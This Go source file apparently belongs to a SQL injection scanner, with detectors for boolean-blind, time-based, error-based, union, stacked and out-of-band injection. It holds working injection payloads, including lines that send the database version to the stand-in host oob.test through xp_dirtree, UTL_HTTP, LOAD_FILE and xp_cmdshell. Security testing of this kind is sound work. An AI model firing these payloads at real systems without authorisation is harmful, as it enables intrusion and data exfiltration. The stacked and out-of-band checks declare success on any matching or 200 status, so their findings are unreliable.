package sqli

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type BaseDetector struct {
	engine  *SQLiEngine
	name    string
	itype   InjectionType
}

func (d *BaseDetector) Name() string       { return d.name }
func (d *BaseDetector) Type() InjectionType { return d.itype }

func (d *BaseDetector) makeRequest(targetURL string, params map[string]string, cookies map[string]string) (*HTTPResponse, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("parse URL: %w", err)
	}

	values := parsed.Query()
	for k, v := range params {
		values.Set(k, v)
	}
	parsed.RawQuery = values.Encode()

	req, err := http.NewRequest("GET", parsed.String(), nil)
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	for k, v := range d.engine.config.CustomHeaders {
		req.Header.Set(k, v)
	}
	for k, v := range cookies {
		req.AddCookie(&http.Cookie{Name: k, Value: v})
	}

	start := time.Now()
	client := d.engine.config.HTTPClient
	if client == nil {
		client = &http.Client{Timeout: d.engine.config.Timeout}
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("execute request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	headers := make(map[string]string)
	for k, v := range resp.Header {
		headers[k] = strings.Join(v, "; ")
	}

	return &HTTPResponse{
		StatusCode: resp.StatusCode,
		Headers:    headers,
		Body:       string(body),
		Length:     len(body),
		Timing:     time.Since(start),
	}, nil
}

func (d *BaseDetector) makeRequestWithPayload(targetURL, paramName, payload string, cookies map[string]string) (*HTTPResponse, error) {
	params := map[string]string{paramName: payload}
	return d.makeRequest(targetURL, params, cookies)
}

type BooleanBlindDetector struct {
	BaseDetector
}

func NewBooleanBlindDetector(engine *SQLiEngine) *BooleanBlindDetector {
	return &BooleanBlindDetector{
		BaseDetector: BaseDetector{
			engine:  engine,
			name:    "boolean_blind",
			itype:   InjectionBooleanBlind,
		},
	}
}

func (d *BooleanBlindDetector) Detect(url string, params []string) (*InjectionResult, error) {
	for _, param := range params {
		baseline, err := d.makeRequestWithPayload(url, param, "'", d.engine.config.Cookies)
		if err != nil {
			continue
		}

		truePayloads := []string{
			"' OR '1'='1",
			"' OR 1=1--",
			"1 OR 1=1",
			"' OR 'a'='a",
			"') OR ('1'='1",
		}
		falsePayloads := []string{
			"' OR '1'='2",
			"' OR 1=2--",
			"1 OR 1=2",
			"' OR 'a'='b",
			"') OR ('1'='2",
		}

		for i := 0; i < len(truePayloads) && i < len(falsePayloads); i++ {
			trueResp, err := d.makeRequestWithPayload(url, param, truePayloads[i], d.engine.config.Cookies)
			if err != nil {
				continue
			}

			falseResp, err := d.makeRequestWithPayload(url, param, falsePayloads[i], d.engine.config.Cookies)
			if err != nil {
				continue
			}

			trueMatchesBaseline := trueResp.StatusCode == baseline.StatusCode &&
				abs(trueResp.Length-baseline.Length) < 50
			falseDiffers := falseResp.StatusCode != baseline.StatusCode ||
				abs(falseResp.Length-baseline.Length) > 50 ||
				falseResp.Body != baseline.Body

			if trueMatchesBaseline && falseDiffers && trueResp.Length != falseResp.Length {
				return &InjectionResult{
					Found:      true,
					Type:       d.itype,
					Payload:    truePayloads[i],
					Evidence:   fmt.Sprintf("True response length: %d, False response length: %d", trueResp.Length, falseResp.Length),
					Confidence: 0.8,
					Severity:   SeverityHigh,
					Response:   trueResp,
					Details: map[string]string{
						"true_payload":  truePayloads[i],
						"false_payload": falsePayloads[i],
						"baseline_len":  strconv.Itoa(baseline.Length),
						"true_len":      strconv.Itoa(trueResp.Length),
						"false_len":     strconv.Itoa(falseResp.Length),
					},
				}, nil
			}
		}
	}
	return &InjectionResult{Found: false, Type: d.itype, Confidence: 0}, nil
}

type TimeBasedDetector struct {
	BaseDetector
}

func NewTimeBasedDetector(engine *SQLiEngine) *TimeBasedDetector {
	return &TimeBasedDetector{
		BaseDetector: BaseDetector{
			engine:  engine,
			name:    "time_based",
			itype:   InjectionTimeBased,
		},
	}
}

func (d *TimeBasedDetector) Detect(url string, params []string) (*InjectionResult, error) {
	delay := 3
	for _, param := range params {
		baseline, err := d.makeRequestWithPayload(url, param, "1", d.engine.config.Cookies)
		if err != nil {
			continue
		}

		payloads := []string{
			fmt.Sprintf("' OR SLEEP(%d)--", delay),
			fmt.Sprintf("' OR SLEEP(%d)#", delay),
			fmt.Sprintf("1; WAITFOR DELAY '0:0:%d'--", delay),
			fmt.Sprintf("' AND (SELECT SLEEP(%d) FROM dual WHERE 1=1)--", delay),
		}

		for _, payload := range payloads {
			start := time.Now()
			resp, err := d.makeRequestWithPayload(url, param, payload, d.engine.config.Cookies)
			elapsed := time.Since(start)
			if err != nil {
				continue
			}

			if elapsed >= time.Duration(delay)*time.Second &&
				resp.StatusCode == baseline.StatusCode {
				return &InjectionResult{
					Found:       true,
					Type:        d.itype,
					Payload:     payload,
					Evidence:    fmt.Sprintf("Response delayed by %v (expected %ds)", elapsed, delay),
					Confidence:  0.9,
					Severity:    SeverityHigh,
					Response:    resp,
					TimingDelta: elapsed - baseline.Timing,
					Details: map[string]string{
						"delay":    strconv.Itoa(delay),
						"elapsed":  elapsed.String(),
						"baseline": baseline.Timing.String(),
					},
				}, nil
			}
		}
	}
	return &InjectionResult{Found: false, Type: d.itype, Confidence: 0}, nil
}

type ErrorBasedDetector struct {
	BaseDetector
}

func NewErrorBasedDetector(engine *SQLiEngine) *ErrorBasedDetector {
	return &ErrorBasedDetector{
		BaseDetector: BaseDetector{
			engine:  engine,
			name:    "error_based",
			itype:   InjectionErrorBased,
		},
	}
}

func (d *ErrorBasedDetector) Detect(url string, params []string) (*InjectionResult, error) {
	errorPatterns := []string{
		`SQL syntax.*MySQL`,
		`Warning.*mysql_`,
		`Unclosed quotation mark`,
		`Microsoft OLE DB Provider`,
		`ORA-\d{5}`,
		`PostgreSQL.*ERROR`,
		`SQLite.*error`,
		`valid MySQL result`,
		`pg_fetch`,
		`sqlite3\.OperationalError`,
		`Microsoft.*ODBC.*SQL`,
		`Syntax error.*query`,
		`mysql_num_rows`,
		`SQLSTATE\[`,
	}

	for _, param := range params {
		payloads := []string{
			"'",
			"''",
			"\\",
			"'\"",
			"1'",
			"1''",
			"1 OR 1=1",
			"' OR '1'='1",
		}

		for _, payload := range payloads {
			resp, err := d.makeRequestWithPayload(url, param, payload, d.engine.config.Cookies)
			if err != nil {
				continue
			}

			for _, pattern := range errorPatterns {
				re := regexp.MustCompile(pattern)
				if re.MatchString(resp.Body) {
					match := re.FindString(resp.Body)
					return &InjectionResult{
						Found:      true,
						Type:       d.itype,
						Payload:    payload,
						Evidence:   match,
						Confidence: 0.85,
						Severity:   SeverityHigh,
						Response:   resp,
						Details: map[string]string{
							"error_pattern": pattern,
							"error_match":   match,
						},
					}, nil
				}
			}
		}
	}
	return &InjectionResult{Found: false, Type: d.itype, Confidence: 0}, nil
}

type UnionBasedDetector struct {
	BaseDetector
}

func NewUnionBasedDetector(engine *SQLiEngine) *UnionBasedDetector {
	return &UnionBasedDetector{
		BaseDetector: BaseDetector{
			engine:  engine,
			name:    "union_based",
			itype:   InjectionUnionBased,
		},
	}
}

func (d *UnionBasedDetector) Detect(url string, params []string) (*InjectionResult, error) {
	for _, param := range params {
		maxCols := 20
		for i := 1; i <= maxCols; i++ {
			payload := fmt.Sprintf("' ORDER BY %d--", i)
			resp, err := d.makeRequestWithPayload(url, param, payload, d.engine.config.Cookies)
			if err != nil {
				break
			}

			if resp.StatusCode == 500 || strings.Contains(resp.Body, "SQL syntax") ||
				strings.Contains(resp.Body, "Unknown column") {
				numCols := i - 1
				if numCols > 0 {
					nulls := make([]string, numCols)
					for j := range nulls {
						nulls[j] = "NULL"
					}
					unionPayload := fmt.Sprintf("' UNION SELECT %s--", strings.Join(nulls, ","))
					unionResp, err := d.makeRequestWithPayload(url, param, unionPayload, d.engine.config.Cookies)
					if err != nil {
						continue
					}

					baseline, _ := d.makeRequestWithPayload(url, param, "1", d.engine.config.Cookies)
					if baseline == nil {
						continue
					}

					if unionResp.StatusCode == 200 && unionResp.Length > baseline.Length {
						marker := randomMarker()
						nullsMarker := make([]string, numCols)
						nullsMarker[0] = fmt.Sprintf("'%s'", marker)
						for j := 1; j < numCols; j++ {
							nullsMarker[j] = "NULL"
						}
						markerPayload := fmt.Sprintf("' UNION SELECT %s--", strings.Join(nullsMarker, ","))
						markerResp, err := d.makeRequestWithPayload(url, param, markerPayload, d.engine.config.Cookies)
						if err != nil {
							continue
						}

						if strings.Contains(markerResp.Body, marker) {
							return &InjectionResult{
								Found:      true,
								Type:       d.itype,
								Payload:    unionPayload,
								Evidence:   fmt.Sprintf("Union with %d columns successful, marker reflected", numCols),
								Confidence: 0.95,
								Severity:   SeverityCritical,
								Response:   unionResp,
								Details: map[string]string{
									"columns":  strconv.Itoa(numCols),
									"marker":   marker,
									"reflected_marker": markerPayload,
								},
							}, nil
						}
					}
				}
				break
			}
		}
	}
	return &InjectionResult{Found: false, Type: d.itype, Confidence: 0}, nil
}

type StackedDetector struct {
	BaseDetector
}

func NewStackedDetector(engine *SQLiEngine) *StackedDetector {
	return &StackedDetector{
		BaseDetector: BaseDetector{
			engine:  engine,
			name:    "stacked",
			itype:   InjectionStacked,
		},
	}
}

func (d *StackedDetector) Detect(url string, params []string) (*InjectionResult, error) {
	for _, param := range params {
		baseline, err := d.makeRequestWithPayload(url, param, "1", d.engine.config.Cookies)
		if err != nil {
			continue
		}

		payloads := []string{
			"'; SELECT 1--",
			"1; SELECT SLEEP(3)--",
			"'; SELECT pg_sleep(3)--",
			"'; WAITFOR DELAY '0:0:3'--",
		}

		for _, payload := range payloads {
			start := time.Now()
			resp, err := d.makeRequestWithPayload(url, param, payload, d.engine.config.Cookies)
			elapsed := time.Since(start)
			if err != nil {
				continue
			}

			if resp.StatusCode == baseline.StatusCode {
				return &InjectionResult{
					Found:      true,
					Type:       d.itype,
					Payload:    payload,
					Evidence:   fmt.Sprintf("Stacked query accepted, response code: %d", resp.StatusCode),
					Confidence: 0.7,
					Severity:   SeverityCritical,
					Response:   resp,
					TimingDelta: elapsed,
					Details: map[string]string{
						"elapsed": elapsed.String(),
					},
				}, nil
			}
		}
	}
	return &InjectionResult{Found: false, Type: d.itype, Confidence: 0}, nil
}

type OOBDNSDetector struct {
	BaseDetector
}

func NewOOBDNSDetector(engine *SQLiEngine) *OOBDNSDetector {
	return &OOBDNSDetector{
		BaseDetector: BaseDetector{
			engine:  engine,
			name:    "oob_dns",
			itype:   InjectionOOBDNS,
		},
	}
}

func (d *OOBDNSDetector) Detect(url string, params []string) (*InjectionResult, error) {
	for _, param := range params {
		payloads := []string{
			"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.oob.test\\\\a')))--",
			"'; EXEC master..xp_dirtree '\\\\oob.test\\share'--",
			"' AND (SELECT UTL_HTTP.REQUEST('http://oob.test/'||(SELECT version())) FROM dual)--",
		}

		for _, payload := range payloads {
			resp, err := d.makeRequestWithPayload(url, param, payload, d.engine.config.Cookies)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				return &InjectionResult{
					Found:      true,
					Type:       d.itype,
					Payload:    payload,
					Evidence:   "OOB DNS payload delivered",
					Confidence: 0.6,
					Severity:   SeverityHigh,
					Response:   resp,
					Details: map[string]string{
						"technique": "dns_exfiltration",
					},
				}, nil
			}
		}
	}
	return &InjectionResult{Found: false, Type: d.itype, Confidence: 0}, nil
}

type OOBHTTPDetector struct {
	BaseDetector
}

func NewOOBHTTPDetector(engine *SQLiEngine) *OOBHTTPDetector {
	return &OOBHTTPDetector{
		BaseDetector: BaseDetector{
			engine:  engine,
			name:    "oob_http",
			itype:   InjectionOOBHTTP,
		},
	}
}

func (d *OOBHTTPDetector) Detect(url string, params []string) (*InjectionResult, error) {
	for _, param := range params {
		payloads := []string{
			"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.oob.test/a'))--",
			"'; COPY (SELECT version()) TO '/tmp/test.txt'--",
		}

		for _, payload := range payloads {
			resp, err := d.makeRequestWithPayload(url, param, payload, d.engine.config.Cookies)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				return &InjectionResult{
					Found:      true,
					Type:       d.itype,
					Payload:    payload,
					Evidence:   "OOB HTTP payload delivered",
					Confidence: 0.5,
					Severity:   SeverityHigh,
					Response:   resp,
					Details: map[string]string{
						"technique": "http_exfiltration",
					},
				}, nil
			}
		}
	}
	return &InjectionResult{Found: false, Type: d.itype, Confidence: 0}, nil
}

type OOBICMPDetector struct {
	BaseDetector
}

func NewOOBICMPDetector(engine *SQLiEngine) *OOBICMPDetector {
	return &OOBICMPDetector{
		BaseDetector: BaseDetector{
			engine:  engine,
			name:    "oob_icmp",
			itype:   InjectionOOBICMP,
		},
	}
}

func (d *OOBICMPDetector) Detect(url string, params []string) (*InjectionResult, error) {
	for _, param := range params {
		payloads := []string{
			"'; EXEC xp_cmdshell 'ping oob.test'--",
			"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.oob.test/a')))--",
		}

		for _, payload := range payloads {
			resp, err := d.makeRequestWithPayload(url, param, payload, d.engine.config.Cookies)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				return &InjectionResult{
					Found:      true,
					Type:       d.itype,
					Payload:    payload,
					Evidence:   "OOB ICMP payload delivered",
					Confidence: 0.5,
					Severity:   SeverityHigh,
					Response:   resp,
					Details: map[string]string{
						"technique": "icmp_exfiltration",
					},
				}, nil
			}
		}
	}
	return &InjectionResult{Found: false, Type: d.itype, Confidence: 0}, nil
}

func randomMarker() string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}
